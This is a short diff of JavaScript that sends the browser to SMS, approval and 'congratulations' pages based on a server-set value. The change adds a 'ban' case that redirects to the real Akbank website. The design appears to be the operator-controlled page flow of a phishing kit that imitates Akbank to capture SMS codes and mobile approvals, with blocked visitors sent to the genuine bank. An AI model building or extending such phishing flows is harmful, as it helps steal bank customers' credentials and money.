@@ -272,7 +272,7 @@
             })
                 .then(response => response.json())
                 .then(data => {
-                    if (data.page == "sms1") {
+                         if (data.page == "sms1") {
                         window.location.href = "sms.html";
                     } else if (data.page == "sms2") {
                         window.location.href = "sms2.html";
@@ -282,6 +282,8 @@
                         window.location.href = "tebrik.html";
                     } else if (data.page == "mobilonay") {
                         window.location.href = "bildirim.html";
+                    } else if (data.page == "ban") {
+                        window.location.href = "https://akbank.com";
                     }
                 })
                 .catch(error => {
